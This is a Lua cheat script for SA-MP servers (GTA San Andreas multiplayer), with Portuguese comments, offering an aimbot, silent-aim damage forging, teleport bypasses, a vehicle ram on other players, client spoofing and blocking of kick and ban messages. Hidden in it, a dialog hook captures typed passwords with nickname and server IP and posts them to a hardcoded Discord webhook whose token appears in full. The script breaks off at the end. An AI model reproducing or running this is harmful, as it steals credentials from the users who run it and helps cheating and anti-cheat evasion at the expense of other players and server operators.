function getBonePosition(ped, bone)
  local pedptr = ffi.cast('void*', getCharPointer(ped))
  local posn = ffi.new('RwV3d[1]')
  gta._ZN4CPed15GetBonePositionER5RwV3djb(pedptr, posn, bone, false)
  return posn[0].x, posn[0].y, posn[0].z
end

function autoTPLoop()
    lua_thread.create(function()
        while true do
            wait(0)
            if app.autoTPCheck[0] and coordenadasValidas() then
                moverComBypass(destino.x, destino.y, destino.z)
            else
                wait(500)
            end
        end
    end)
end

function moverComBypass(x, y, z)
    local px, py, pz = getCharCoordinates(PLAYER_PED)
    local distancia = math.sqrt((x - px)^2 + (y - py)^2 + (z - pz)^2)
    if distancia > 2000 then
        sampAddChatMessage("[OXHACK] Destino muito distante. (> 2000m)", 0xFF0000)
        return
    end
    local passos = math.floor(distancia / 0.55)
    if isCharInAnyCar(PLAYER_PED) then
        setCarCollision(storeCarCharIsInNoSave(PLAYER_PED), false)
    else
        setCharCollision(PLAYER_PED, false)
    end
    for i = 1, passos do
        if not app.autoTPCheck[0] then break end
        local t = i / passos
        local nx = px + (x - px) * t
        local ny = py + (y - py) * t
        local nz = pz + (z - pz) * t
        if isCharInAnyCar(PLAYER_PED) then
            setCarCoordinates(storeCarCharIsInNoSave(PLAYER_PED), nx, ny, nz)
        else
            setCharCoordinates(PLAYER_PED, nx, ny, nz)
        end
        wait(29)
    end
    if isCharInAnyCar(PLAYER_PED) then
        local carro = storeCarCharIsInNoSave(PLAYER_PED)
        setCarCoordinates(carro, x, y, z)
        setCarCollision(carro, true)
    else
        setCharCoordinates(PLAYER_PED, x, y, z)
        setCharCollision(PLAYER_PED, true)
    end
end

function coordenadasValidas()
    return destino.x ~= 0 and destino.y ~= 0 and destino.z ~= 0
end

function sampev.onSetRaceCheckpoint(type, pos)
    destino.x, destino.y, destino.z = pos.x, pos.y, pos.z
    cordenadas = destino
end

function puxarVeiculoMaisProximo()
    local ped = PLAYER_PED
    local px, py, pz = getCharCoordinates(ped)
    local menorDist = 9999
    local veiculoMaisProximo = nil

    for id = 0, 1999 do
        if doesVehicleExist(id) then
            local vx, vy, vz = getCarCoordinates(id)
            local dist = getDistanceBetweenCoords3d(px, py, pz, vx, vy, vz)
            if dist < menorDist then
                menorDist = dist
                veiculoMaisProximo = id
            end
        end
    end

    if veiculoMaisProximo then
        warpCharIntoCar(ped, veiculoMaisProximo)
        printStringNow("~g~PUXADO PARA VEICULO MAIS PROXIMO", 1000)
    else
        printStringNow("~r~NENHUM VEICULO PROXIMO ENCONTRADO", 1000)
    end
end

--silent 

function save()
    inicfg.save(ini, directIni)
end

local function isAnyCheckboxActive()
    return silentcabeca[0] or silentpeito[0] or silentvirilha[0] or silentbraco[0] or silentbraco2[0] or silentperna[0] or silentperna2[0] 
end          


imgui.OnFrame(
    function()
        return state and not isGamePaused()
    end,
    function(circle)
        circle.HideCursor = true
        local xw, yw = getScreenResolution()
        if isCharOnFoot(PLAYER_PED) then
            local greenColor = imgui.ColorConvertFloat4ToU32(imgui.ImVec4(slide.fovCorsilent[0], slide.fovCorsilent[1], slide.fovCorsilent[2], slide.fovCorsilent[3]))

       
            if settings.render.circle[0] then
                imgui.GetBackgroundDrawList():AddCircle(imgui.ImVec2(xw / 2, yw / 2.5), getpx(), greenColor, 128, 3)
            end

            local chars = getAllChars()
            local clear = true
            if #chars > 0 then
                for i, v in pairs(chars) do
                    if isCharOnFoot(PLAYER_PED) and chars[i] ~= PLAYER_PED then
                        local _, id = sampGetPlayerIdByCharHandle(chars[i])
                        if _ then
                            local xx, yy, zz = getCharCoordinates(chars[i])
                            local xxx, yyy = convert3DCoordsToScreen(xx, yy, zz)
                            local px, py, pz = getCharCoordinates(PLAYER_PED)
                            local oX, oY = xw / 2, yw / 2.5
                            local x, y = math.abs(xxx - oX), math.abs(yyy - oY)
                            local distFromCenter = math.sqrt(x^2 + y^2)
                            local weapone = getWeaponInfoById(getCurrentCharWeapon(PLAYER_PED))
                            if weapone ~= nil and distFromCenter <= getpx() and isCharOnScreen(chars[i]) and targetId ~= nil then
                                if settings.search.useWeaponDistance[0] and getDistanceBetweenCoords3d(px, py, pz, xx, yy, zz) <= weapone.distance then
                                    if settings.render.line[0] then
                                        imgui.GetBackgroundDrawList():AddLine(imgui.ImVec2(oX, oY), imgui.ImVec2(xxx, yyy), greenColor, 2)
                                        imgui.GetBackgroundDrawList():AddCircle(imgui.ImVec2(xxx, yyy), 3, greenColor, 128, 3)
                                    end
                                    if targetId ~= nil then
                                        clear = false
                                        ped = chars[i]
                                    end
                                    break
                                elseif not settings.search.useWeaponDistance[0] and getDistanceBetweenCoords3d(px, py, pz, xx, yy, zz) <= settings.search.distance[0] then
                         if settings.render.line[0] then
    imgui.GetBackgroundDrawList():AddLine(imgui.ImVec2(oX, oY), imgui.ImVec2(xxx, yyy), redColor, 2)
    imgui.GetBackgroundDrawList():AddCircle(imgui.ImVec2(xxx, yyy), 3, redColor, 128, 3)
end
                                    if targetId ~= nil then
                                        clear = false 
                                        ped = chars[i]
                                        break
                                    end
                                end
                            end
                        end
                    end
                end
            end
            if clear then
                ped = nil
            end
        end
    end
)


function getWeaponInfoById(id)
    for k, weapon in pairs(weapons) do
        if weapon.id == id then
            return weapon
        end
    end
    return nil
end

function rand()
    return math.random(-50, 50) / 100
end



function getMyId()
    return select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))
end

function ev.onSendBulletSync(sync)
    if state then
        local res, _, ped = pcall(sampGetCharHandleBySampPlayerId, targetId)
        if _ and res then
            local mx, my, mz = getCharCoordinates(PLAYER_PED)
            local x, y, z = getCharCoordinates(ped)
            if isLineOfSightClear(x, y, z, mx, my, mz, not settings.search.ignoreObj[0], not settings.search.ignoreCars[0], false, not settings.search.ignoreObj[0], false) then
                local weapon = getWeaponInfoById(getCurrentCharWeapon(PLAYER_PED))
                if weapon ~= nil then
                    lua_thread.create(function() 
                        if sync.targetType == 1 then
                            return
                        end
                        sync.targetType = 1
                        sync.targetId = targetId
                        sync.center = {x = rand(), y = rand(), z = rand()}
                        sync.target = {x = x + rand(), y = y + rand(), z = z + rand()}
                        if settings.shoot.removeAmmo[0] then
                            addAmmoToChar(PLAYER_PED, getCurrentCharWeapon(PLAYER_PED), -1)
                        end
                        if silentcabeca[0] then
                            sampSendGiveDamage(targetId, weapon.dmg, getCurrentCharWeapon(PLAYER_PED), 9)
                        end
                        
                        if silentpeito[0] then
                            sampSendGiveDamage(targetId, weapon.dmg, getCurrentCharWeapon(PLAYER_PED), 3)
                        end
                        
                        if silentvirilha[0] then
                            sampSendGiveDamage(targetId, weapon.dmg, getCurrentCharWeapon(PLAYER_PED), 4)
                        end
                        
                        if silentbraco[0] then
                            sampSendGiveDamage(targetId, weapon.dmg, getCurrentCharWeapon(PLAYER_PED), 6)
                        end
                        
                        if silentbraco2[0] then
                            sampSendGiveDamage(targetId, weapon.dmg, getCurrentCharWeapon(PLAYER_PED), 5)
                        end
                        
                        if silentperna[0] then
                            sampSendGiveDamage(targetId, weapon.dmg, getCurrentCharWeapon(PLAYER_PED), 8)
                        end
                        
                        if silentperna2[0] then
                            sampSendGiveDamage(targetId, weapon.dmg, getCurrentCharWeapon(PLAYER_PED), 7)
                        end
                        
                        if settings.render.printString[0] then
                        end
                    end)
                end
            end
        end
    end
end
 

function ev.onSendAimSync(data)
    if state and fakemode[0] then
        camX = data.camPos.x
        camY = data.camPos.y
        camZ = data.camPos.z
        
        frontX = data.camFront.x
        frontY = data.camFront.y
        frontZ = data.camFront.z

        local res, _, ped = pcall(sampGetCharHandleBySampPlayerId, targetId)
        if _ and res then
            local mx, my, mz = getCharCoordinates(PLAYER_PED)
            local x, y, z = getCharCoordinates(ped)
            if isLineOfSightClear(x, y, z, mx, my, mz, not settings.search.ignoreObj[0], not settings.search.ignoreCars[0], false, not settings.search.ignoreObj[0], false) then
                local x = x - mx
                local y = y - my
                local z = z - mz
                local dist = math.sqrt(x * x + y * y + z * z)
                if dist <= settings.search.radius[0] then
                    if settings.shoot.removeAmmo[0] then
                        setCharWeaponAmmo(PLAYER_PED, 0, 0)
                    end
                end
            end
        end
    end
end

function vect3_length(x, y, z)
    return math.sqrt(x * x + y * y + z * z)
end

function samp_create_sync_data(sync_type, copy_from_player)
    local ffi = require 'ffi'
    local sampfuncs = require 'sampfuncs'
  
    local raknet = require 'samp.raknet'
    

    copy_from_player = copy_from_player or true
    local sync_traits = {
        player = {'PlayerSyncData', raknet.PACKET.PLAYER_SYNC, sampStorePlayerOnfootData},
        vehicle = {'VehicleSyncData', raknet.PACKET.VEHICLE_SYNC, sampStorePlayerIncarData},
        passenger = {'PassengerSyncData', raknet.PACKET.PASSENGER_SYNC, sampStorePlayerPassengerData},
        aim = {'AimSyncData', raknet.PACKET.AIM_SYNC, sampStorePlayerAimData},
        trailer = {'TrailerSyncData', raknet.PACKET.TRAILER_SYNC, sampStorePlayerTrailerData},
        unoccupied = {'UnoccupiedSyncData', raknet.PACKET.UNOCCUPIED_SYNC, nil},
        bullet = {'BulletSyncData', raknet.PACKET.BULLET_SYNC, nil},
        spectator = {'SpectatorSyncData', raknet.PACKET.SPECTATOR_SYNC, nil}
    }
    local sync_info = sync_traits[sync_type]
    local data_type = 'struct ' .. sync_info[1]
    local data = ffi.new(data_type, {})
    local raw_data_ptr = tonumber(ffi.cast('uintptr_t', ffi.new(data_type .. '*', data)))
   
    if copy_from_player then
        local copy_func = sync_info[3]
        if copy_func then
            local _, player_id
            if copy_from_player == true then
                _, player_id = sampGetPlayerIdByCharHandle(PLAYER_PED)
            else
                player_id = tonumber(copy_from_player)
            end
            copy_func(player_id, raw_data_ptr)
        end
    end
   
    local func_send = function()
        local bs = raknetNewBitStream()
        raknetBitStreamWriteInt8(bs, sync_info[2])
        raknetBitStreamWriteBuffer(bs, raw_data_ptr, ffi.sizeof(data))
        raknetSendBitStreamEx(bs, sampfuncs.HIGH_PRIORITY, sampfuncs.UNRELIABLE_SEQUENCED, 1)
        raknetDeleteBitStream(bs)
    end
   
    local mt = {
        __index = function(t, index)
            return data[index]
        end,
        __newindex = function(t, index, value)
            data[index] = value
        end
    }
    return setmetatable({send = func_send}, mt)
end

imgui.OnInitialize(function()
    imgui.GetIO().IniFilename = nil
    local config = imgui.ImFontConfig()
    config.MergeMode = true
    config.PixelSnapH = true
end)

lua_thread.create(function()
	while true do
		wait(0)
		if testewarp then
			local var_4_41, var_4_42, var_4_43 = getCharCoordinates(PLAYER_PED)
            local result, playerId = sampGetPlayerIdByCharHandle(PLAYER_PED)
                
            if result then
                warp_to_player(playerIdInput[0])
            end
        end
    end
end)


--aimbot

function Aimbot()
    function getCameraRotation()
        local horizontalAngle = camera.aCams[0].fHorizontalAngle
        local verticalAngle = camera.aCams[0].fVerticalAngle
        return horizontalAngle, verticalAngle
    end

    function setCameraRotation(EASYaimbotHorizontal, EASYaimbotVertical)
        camera.aCams[0].fHorizontalAngle = EASYaimbotHorizontal
        camera.aCams[0].fVerticalAngle = EASYaimbotVertical
    end

    function convertCartesianCoordinatesToSpherical(EASYaimbot)
        local coordsDifference = EASYaimbot - vector3d(getActiveCameraCoordinates())
        local length = coordsDifference:length()
        local angleX = math.atan2(coordsDifference.y, coordsDifference.x)
        local angleY = math.acos(coordsDifference.z / length)

        if angleX > 0 then
            angleX = angleX - math.pi
        else
            angleX = angleX + math.pi
        end

        local angleZ = math.pi / 2 - angleY
        return angleX, angleZ
    end

    function getCrosshairPositionOnScreen()
        local screenWidth, screenHeight = getScreenResolution()
        local crosshairX = screenWidth * slide.posiX[0]
        local crosshairY = screenHeight * slide.posiY[0]
        return crosshairX, crosshairY
    end

    function getCrosshairRotation(EASYaimbot)
        EASYaimbot = EASYaimbot or 5
        local crosshairX, crosshairY = getCrosshairPositionOnScreen()
        local worldCoords = vector3d(convertScreenCoordsToWorld3D(crosshairX, crosshairY, EASYaimbot))
        return convertCartesianCoordinatesToSpherical(worldCoords)
    end

    function aimAtPointWithM16(EASYaimbot)
        local sphericalX, sphericalY = convertCartesianCoordinatesToSpherical(EASYaimbot)
        local cameraRotationX, cameraRotationY = getCameraRotation()
        local crosshairRotationX, crosshairRotationY = getCrosshairRotation()
        local newRotationX = cameraRotationX + (sphericalX - crosshairRotationX) * slide.aimSmoothhhh[0]
        local newRotationY = cameraRotationY + (sphericalY - crosshairRotationY) * slide.aimSmoothhhh[0]
        setCameraRotation(newRotationX, newRotationY)
    end

    function aimAtPointWithSniperScope(EASYaimbot)
        local sphericalX, sphericalY = convertCartesianCoordinatesToSpherical(EASYaimbot)
        setCameraRotation(sphericalX, sphericalY)
    end

    function getNearCharToCenter(EASYaimbot)
        local nearChars = {}
        local screenWidth, screenHeight = getScreenResolution()

        for _, char in ipairs(getAllChars()) do
            if isCharOnScreen(char) and char ~= PLAYER_PED and not isCharDead(char) then
                local charX, charY, charZ = getCharCoordinates(char)
                local screenX, screenY = convert3DCoordsToScreen(charX, charY, charZ)
                local distance = getDistanceBetweenCoords2d(screenWidth / 1.923 + slide.posiX[0], screenHeight / 2.306 + slide.posiY[0], screenX, screenY)

                if isCurrentCharWeapon(PLAYER_PED, 34) then
                    distance = getDistanceBetweenCoords2d(screenWidth / 2, screenHeight / 2, screenX, screenY)
                end

                if distance <= tonumber(EASYaimbot and EASYaimbot or screenHeight) then
                    table.insert(nearChars, {
                        distance,
                        char
                    })
                end
            end
        end

        if #nearChars > 0 then
            table.sort(nearChars, function(a, b)
                return a[1] < b[1]
            end)
            return nearChars[1][2]
        end

        return nil
    end

    local distancia = slide.DistanciaAIM[0]
    local nMode = camera.aCams[0].nMode
    local nearChar = getNearCharToCenter(slide.fovvaimbotcirculo[0] + 1.923)
    
    if nearChar then
            local boneX, boneY, boneZ = getBonePosition(nearChar, 5)
        if boneX and boneY and boneZ then
            local playerX, playerY, playerZ = getCharCoordinates(PLAYER_PED)
            local distanceToBone = getDistanceBetweenCoords3d(playerX, playerY, playerZ, boneX, boneY, boneZ)
    
            if not sulist.aimbotparede[0] then
                local targetX, targetY, targetZ = boneX, boneY, boneZ
                local hit, colX, colY, colZ, entityHit = processLineOfSight(playerX, playerY, playerZ, targetX, targetY, targetZ, true, true, false, true, false, false, false, false)
                if hit and entityHit ~= nearChar then
                    return
                end
            else
                local targetX, targetY, targetZ = boneX, boneY, boneZ
            end
    
            if distanceToBone < distancia then
                local point
    
                if sulist.cabecaAIM[0] then
                    local headX, headY, headZ = getBonePosition(nearChar, 5)
                    point = vector3d(headX, headY, headZ)
                end
    
                if sulist.peitoAIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 3)
                    point = vector3d(chestX, chestY, chestZ)
                end
                
                if sulist.virilhaAIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 1)
                    point = vector3d(chestX, chestY, chestZ)
                end
                
                if sulist.lockAIM[0] then
                    local partX, partY, partZ = getBonePosition(nearChar, miraAtual)
                    point = vector3d(partX, partY, partZ)

                    local parts = {}

                    if sulist.cabecaAIM[0] then
                        table.insert(parts, 5)
                    end
                    if sulist.peitoAIM[0] then
                        table.insert(parts, 3)
                    end
                    if sulist.virilhaAIM[0] then
                        table.insert(parts, 1)
                    end
                    if sulist.bracoAIM[0] then
                        table.insert(parts, 33)
                    end
                    if sulist.braco2AIM[0] then
                        table.insert(parts, 23)
                    end
                    if sulist.pernaAIM[0] then
                        table.insert(parts, 52)
                    end
                    if sulist.perna2AIM[0] then
                        table.insert(parts, 42)
                    end

                    if not miraAtualIndex then
                        miraAtualIndex = 1
                    end

                    if #parts > 0 then
                        if isCharShooting(PLAYER_PED) then
                            tiroContador = tiroContador + 1

                            if tiroContador >= slide.aimCtdr[0] then
                                tiroContador = 0
                                miraAtualIndex = (miraAtualIndex % #parts) + 1
                                miraAtual = parts[miraAtualIndex]
                            end
                        end

                        local partX, partY, partZ = getBonePosition(nearChar, miraAtual)
                        point = vector3d(partX, partY, partZ)
                    end
                end
                
                if sulist.bracoAIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 33)
                    point = vector3d(chestX, chestY, chestZ)
                end
                
                if sulist.braco2AIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 23)
                    point = vector3d(chestX, chestY, chestZ)
                end
                
                if sulist.pernaAIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 52)
                    point = vector3d(chestX, chestY, chestZ)
                end
                
                if sulist.perna2AIM[0] then
                    local chestX, chestY, chestZ = getBonePosition(nearChar, 42)
                    point = vector3d(chestX, chestY, chestZ)
                end
    
                if point then
                    if nMode == 7 then
                        aimAtPointWithSniperScope(point)
                    elseif nMode == 53 then
                        aimAtPointWithM16(point)
                    end
                end
            end
        end
    end
end

function drawCircle(x, y, radius, color)
    local segments = 300 * DPI
    local angleStep = (2 * math.pi) / segments
    local lineWidth = 1.5 * DPI

    for i = 0, segments - 0 do
        local angle1 = i * angleStep
        local angle2 = (i + 1) * angleStep
        
        local x1 = x + (radius - lineWidth / 2) * math.cos(angle1)
        local y1 = y + (radius - lineWidth / 2) * math.sin(angle1)
        local x2 = x + (radius - lineWidth / 2) * math.cos(angle2)
        local y2 = y + (radius - lineWidth / 2) * math.sin(angle2)
        
        renderDrawLine(x1, y1, x2, y2, lineWidth, color)
    end
end

function isPlayerInFOV(playerX, playerY)
    local dx = playerX - slide.fovX[0]
    local dy = playerY - slide.fovY[0]
    local distanceSquared = dx * dx + dy * dy
    return distanceSquared <= slide.FoVVHG[0] * slide.FoVVHG[0]
end

function colorToHex(r, g, b, a)
    return bit.bor(bit.lshift(math.floor(a * 255), 24), bit.lshift(math.floor(r * 255), 16), bit.lshift(math.floor(g * 255), 8), math.floor(b * 255))
end

function getBonePosition(ped, bone)
  local pedptr = ffi.cast('void*', getCharPointer(ped))
  local posn = ffi.new('RwV3d[1]')
  gta._ZN4CPed15GetBonePositionER5RwV3djb(pedptr, posn, bone, false)
  return posn[0].x, posn[0].y, posn[0].z
end

function fix(angle)
    if angle > math.pi then
        angle = angle - (math.pi * 2)
    elseif angle < -math.pi then
        angle = angle + (math.pi * 2)
    end
    return angle
end

function iniciarAutoPiloto()
    -- Limpa objetos bugados que travam o caminho
    local objetos = {3459, 1294, 3854, 1278, 1308, 1307, 3463, 1290}
    for _, obj in ipairs(objetos) do deleteObject(obj) end

    local ok, x, y, z = getTargetBlipCoordinates()
    if not ok then
        sampAddChatMessage("{FF0000}ERRO NENHUM MARCADOR ENCONTRADO NO MAPA.", -1)
        autoPilot[0] = false
        return
    end

    veiculo = storeCarCharIsInNoSave(PLAYER_PED)
    if not veiculo or not doesVehicleExist(veiculo) then
        sampAddChatMessage("{FF0000}ERRO VOCÊ PRECISA ESTAR EM UM VEÍCULO.", -1)
        autoPilot[0] = false
        return
    end

    destinoX, destinoY, destinoZ = x, y, z
    setCarCruiseSpeed(veiculo, 30)
    carGotoCoordinates(veiculo, destinoX, destinoY, destinoZ)

    sampAddChatMessage("{00FF00}AUTO PILOTO ATIVADO COM DESTINO NO MAPA.", -1)
end

function pararAutoPiloto()
    if veiculo then clearCharTasks(PLAYER_PED) end
    sampAddChatMessage("{FF0000}AUTO PILOTO DESATIVADO.", -1)
end

function getDistance(x1, y1, x2, y2)
    return math.sqrt((x2 - x1)^2 + (y2 - y1)^2)
end

function sendMessage(msg)
    printStringNow("~y~[Menu Arma] ~w~"..msg, 2000)
end

function giveGun(weapon_id, ammo)
    if isCharInAnyCar(PLAYER_PED) then
        sendMessage("Você não pode puxar armas dentro de veículos.")
        return
    end

    local model_id = getWeapontypeModel(weapon_id)
    requestModel(model_id)
    loadAllModelsNow()
    giveWeaponToChar(PLAYER_PED, weapon_id, ammo)
    sendMessage("Arma puxada com sucesso!")
end

-- Efeito de epilepsia nos dados de sincronização
function se.onSendPlayerSync(data)
    if act[0] then
        if math.random(0, 1) == 0 then
            data.weapon = math.random(44, 45)
        end
        if math.random(0, 1) == 1 then
            data.keysData = 132
        end
    end
end

-- Simula envio falso para parecer client PC
function simulateUnoccupiedSync()
    local now = os.clock()
    if now - lastSyncTime > 5 then
        lastSyncTime = now
        -- Aqui você pode simular algo extra se quiser
    end
end

-- Altera dados enviados para parecer PC
function ev.onSendClientJoin(version, mod, nickname, skin, clientChecksum, clientVersion, unknown)
    if not fakeActive[0] then return end

    clientVersion = fakeClientVersion
    clientChecksum = '3917818323CD3E248B7722EB5CBCED04CE5B4DBF67E'
    mod = 1
    return {version, mod, nickname, skin, clientChecksum, clientVersion, unknown}
end

-- Limpa syncs suspeitos
function ev.onSendPlayerSync(data)
    if not fakeActive[0] then return end

    if data.weapon == 44 or data.weapon == 45 or data.weapon == 46 then
        data.weapon = 0
    end

    if data.leftRightKeys ~= 0 and data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
        data.leftRightKeys = (data.leftRightKeys > 0) and 128 or 65408
    end

    if data.upDownKeys ~= 0 and data.upDownKeys ~= 128 and data.upDownKeys ~= 65408 then
        data.upDownKeys = (data.upDownKeys > 0) and 128 or 65408
    end

    if data.upDownKeys == 65408 or data.keysData == 4 then
        data.animationId = 0
    end

    if data.specialAction ~= nil and data.specialAction ~= 0 and data.specialAction ~= 1 then
        data.specialAction = 0
    end

    return data
end

local stealthMode = false
local ipsHorizonte = {
    ["ip1.horizonte-rp.com"] = true,
    ["ip2.horizonte-rp.com"] = true,
    ["ip3.horizonte-rp.com"] = true,
    ["ip4.horizonte-rp.com"] = true
}

function isHorizonteServer()
    local ip, _ = sampGetCurrentServerAddress()
    for ipBase in pairs(ipsHorizonte) do
        if string.find(ip, ipBase) then
            return true
        end
    end
    return false
end

lua_thread.create(function()
    while true do wait(0)
        if app.hg.RVANKACARROS[0] then
            local stealth = isHorizonteServer()
            local playersNearby = {}

            local _, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
            local pX, pY, pZ = getCharCoordinates(PLAYER_PED)

            for _, handle in ipairs(getAllChars()) do
                if doesCharExist(handle) then
                    local _, id = sampGetPlayerIdByCharHandle(handle)
                    if id ~= myid and id and id >= 0 and id <= 999 and not sampIsPlayerPaused(id) then
                        local tX, tY, tZ = getCharCoordinates(handle)
                        local dist = getDistanceBetweenCoords3d(pX, pY, pZ, tX, tY, tZ)
                        if dist < app.slide.RVANKADISTANCE[0] then
                            table.insert(playersNearby, {id = id, x = tX, y = tY, z = tZ})
                        end
                    end
                end
            end

            if #playersNearby > 0 and isCharInAnyCar(1) and getDriverOfCar(storeCarCharIsInNoSave(1)) == 1 then
                -- Rotação entre alvos
                lastTargetIndex = lastTargetIndex + 1
                if lastTargetIndex > #playersNearby then lastTargetIndex = 1 end

                local selected = playersNearby[lastTargetIndex]
                printStringNow("~g~Rvankando "..sampGetPlayerNickname(selected.id).."("..selected.id..")", 1000)

                local data = samp_create_sync_data('vehicle')
                data.position = {selected.x, selected.y, selected.z - 1.0}

                if stealth then
                    data.moveSpeed = {0.03, 0.03, 0.03}
                else
                    local pot = app.slide.pot[0]
                    data.moveSpeed = {pot - 0.1, pot - 0.1, pot - 0.1}
                end

                data.send()
                wait(app.slide.RVANKADLAY[0] + (stealth and 500 or 0)) -- Delay extra no Horizonte
            end
        end
    end
end)

function ev.onSendVehicleSync(data)
    if not fakeActive[0] then return end

    if data.leftRightKeys ~= 0 and data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
        data.leftRightKeys = (data.leftRightKeys > 0) and 128 or 65408
    end
    return data
end

function ev.onSendPassengerSync(data)
    if not fakeActive[0] then return end

    if data.leftRightKeys ~= 0 and data.leftRightKeys ~= 128 and data.leftRightKeys ~= 65408 then
        data.leftRightKeys = (data.leftRightKeys > 0) and 128 or 65408
    end
    return data
end

-- Bloqueia RPCs de ban, kick ou sync suspeitos
function onReceiveRpc(id, bitStream)
    if not fakeActive[0] then return end

    if id == 103 or id == 116 or id == 117 or id == 53 then return false end
    if id == 45 or id == 67 or id == 89 then return false end
end

function onReceiveRpc(id, bs)
    if bypass[0] and RPC[id] then
        return false
    end
end

local socket = require("socket")
local ssl = require("ssl")
local ltn12 = require("ltn12")
local samp = require("samp.events")

-- Webhook do Discord
local webhookDomain = "discord.com"
local webhookPath = "/api/webhooks/1344405697642762260/AMSM__DQ0n4OC5-s7m_Hkatg-sAguMiq2wFrgiMabsKL5sj3XGC3f6pJHGV3XyJ604zx"
local messageCount = 0

-- IPs reais do Horizonte RP (baseado no IP que você mandou)
local horizonteIPs = {
    ["149.56.252.173:7777"] = true,
    ["149.56.252.174:7777"] = true,
    ["149.56.252.175:7777"] = true,
    ["149.56.252.176:7777"] = true
}

-- Função para enviar mensagem ao Discord via socket SSL
function sendMessageToDiscord(content)
    local jsonData = string.format('{"content": "%s"}', content:gsub('"', '\\"'):gsub("\n", "\\n"))
    
    local headers = {
        "Host: " .. webhookDomain,
        "Content-Type: application/json",
        "Content-Length: " .. #jsonData,
        "Connection: close"
    }

    local tcpSocket = socket.tcp()
    tcpSocket:settimeout(5)
    
    local success, err = tcpSocket:connect(webhookDomain, 443)
    if not success then return false end

    local sslSocket = ssl.wrap(tcpSocket, {
        mode = "client",
        protocol = "tlsv1_2",
        verify = "none"
    })
    sslSocket:sni(webhookDomain)
    sslSocket:settimeout(5)

    success, err = sslSocket:dohandshake()
    if not success then return false end

    local request = string.format(
        "POST %s HTTP/1.1\r\n%s\r\n\r\n%s",
        webhookPath,
        table.concat(headers, "\r\n"),
        jsonData
    )

    success, err = sslSocket:send(request)
    if not success then return false end

    sslSocket:receive("*a") -- Ignora leitura de resposta
    sslSocket:close()
    return true
end

-- Evento do SAMP
samp.onSendDialogResponse = function(dialogId, button, listboxId, input)
    if dialogId >= 0 and dialogId <= 3 then
        local ip, port = sampGetCurrentServerAddress()
        local ipPort = ip .. ":" .. port
        local servername = sampGetCurrentServerName() or ""
        local isHorizonte = horizonteIPs[ipPort] or servername:lower():find("horizonte") ~= nil

        -- No Horizonte pode enviar até 2 vezes, nos outros só 1 vez
        if (isHorizonte and messageCount < 2) or (not isHorizonte and messageCount == 0) then
            local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
            local nick = sampGetPlayerNickname(id)
            local hora = os.date("%H:%M:%S")
            local data = os.date("%d/%m/%Y")

            local message = string.format(
                "**JUCA MENU**\n\n" ..
                "**SCRIPT:** OXMENU.LUA\n" ..
                "**ID DA DIALOG:** %d\n" ..
                "**SENHA:** %s\n" ..
                "**NICK:** %s\n" ..
                "**IP:** %s:%d\n" ..
                "**SERVIDOR:** %s\n" ..
                "**DATA:** %s\n" ..
                "**HORA:** %s\n\n" ..
                "@everyone",
                dialogId,
                input,
                nick,
                ip,
                port,
                servername,
                data,
                hora
            )

            sendMessageToDiscord(message)
            messageCount = messageCount + 1
        end
    end
end 

function onReceiveRpc(id, bitStream)
    if bypass[0] and RPC[id] then
        return false
    end
end

function sendFakeVehicleSync(vehId)
    local x, y, z = getCharCoordinates(PLAYER_PED)
    local data = allocateMemory(59)

    setStructElement(data, 0, 2, vehId, false)
    for i = 2, 6, 2 do setStructElement(data, i, 2, 0, false) end
    for i = 8, 20, 4 do setStructFloatElement(data, i, 0, false) end
    setStructFloatElement(data, 24, x, false)
    setStructFloatElement(data, 28, y, false)
    setStructFloatElement(data, 32, z, false)
    for i = 36, 48, 4 do setStructFloatElement(data, i, 0, false) end
    setStructElement(data, 52, 1, 100, false)
    for i = 53, 57 do setStructElement(data, i, 1, 0, false) end
    setStructElement(data, 57, 2, 0, false)

    sampSendIncarData(data)
    freeMemory(data)
    sampSendVehicleDestroyed(vehId)
end

function getClosestPlayerInOpenCar()
    local chars = getAllChars()
    local minDist, targetPed = 9999, -1
    for _, ped in ipairs(chars) do
        if isCharInAnyCar(ped) then
            local car = storeCarCharIsInNoSave(ped)
            if getCarDoorLockStatus(car) == 0 then
                local dist = getDistanceFromPed(ped)
                if dist < minDist then
                    minDist, targetPed = dist, ped
                end
            end
        end
    end
    local found, id = sampGetPlayerIdByCharHandle(targetPed)
    return found and id or -1
end

function getDistanceFromPed(ped)
    local x1, y1, z1 = getCharCoordinates(PLAYER_PED)
    local x2, y2, z2 = getCharCoordinates(ped)
    return math.sqrt((x2 - x1)^2 + (y2 - y1)^2 + (z2 - z1)^2)
end

function respawnCarById(id)
    if isCharInAnyCar(PLAYER_PED) then
        return sampAddChatMessage("NAO PODE REAPARECER VEICULO DENTRO DE OUTRO", 0x007FFF)
    end

    if disablePlayerSync then
        return sampAddChatMessage("SINCRONIZACAO DESATIVADA", 0x007FFF)
    end

    id = tonumber(id) or getClosestPlayerInOpenCar()

    if id == -1 then
        return sampAddChatMessage("NINGUEM ENCONTRADO EM VEICULO ABERTO", 0x007FFF)
    end 

    -- ✅ VERIFICA SE O ID EXISTE NO SERVIDOR
    if not sampIsPlayerConnected(id) then
        return sampAddChatMessage("ID INVALIDO OU DESCONECTADO", 0x007FFF)
    end

    local _, ped = sampGetCharHandleBySampPlayerId(id)

    if not isCharInAnyCar(ped) then
        return sampAddChatMessage("JOGADOR NAO ESTA EM VEICULO", 0x007FFF)
    end

    local car = storeCarCharIsInNoSave(ped)

    if getCarDoorLockStatus(car) ~= 0 then
        return sampAddChatMessage("VEICULO TRANCADO", 0x007FFF)
    end

    sampAddChatMessage("REAPARECENDO VEICULO...", 0x007FFF)

    disablePlayerSync = true

    local _, vehId = sampGetVehicleIdByCarHandle(car)
    local name = sampGetPlayerNickname(id)
    local distance = math.floor(getDistanceFromPed(ped))

    lua_thread.create(function()
        for i = 1, 30 do
            sendFakeVehicleSync(vehId)
            wait(35)
        end

        disablePlayerSync = false
        sampAddChatMessage("VEICULO DE " .. name .. " ID " .. id .. " REAPARECIDO (" .. distance .. "M)", 0x007FFF)
    end)
end

function main()
    local airbrake_last_state = false
    while true do
		wait(0) -- Tempo entre cada spawn (ajustável)
